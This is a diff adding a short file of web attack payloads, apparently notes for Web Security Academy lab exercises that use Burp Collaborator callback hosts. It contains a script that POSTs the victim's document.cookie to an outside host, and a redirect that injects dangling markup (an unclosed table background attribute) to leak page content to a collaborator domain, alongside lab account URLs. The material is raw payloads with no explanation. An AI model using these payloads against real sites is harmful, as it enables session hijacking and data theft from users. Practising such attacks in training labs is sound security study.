@@ -1,0 +1,17 @@
+<script>
+fetch('rytbcius51pvuq0vvthnd8bl6cc32rr', {
+method: 'POST', 
+mode: 'no-cors', 
+body:document.cookie
+});
+</script>
+
+http://yqs5j12p3s2aygd8pw3ss901csio6d.burpcollaborator.net
+
+https://ac1f1f601e9d6fccc0216f8d00990086.web-security-academy.net/my-account/change-email
+
+e5klyhh5i8hqdwso4ci87pfhr8x5lu.burpcollaborator.net
+
+<script>
+location='https://ac1f1f601e9d6fccc0216f8d00990086.web-security-academy.net/my-account?email=%22%3E%3Ctable%20background=%27//u2x1vxelfoe6acp41sfo45cxoounic.burpcollaborator.net?';
+</script>
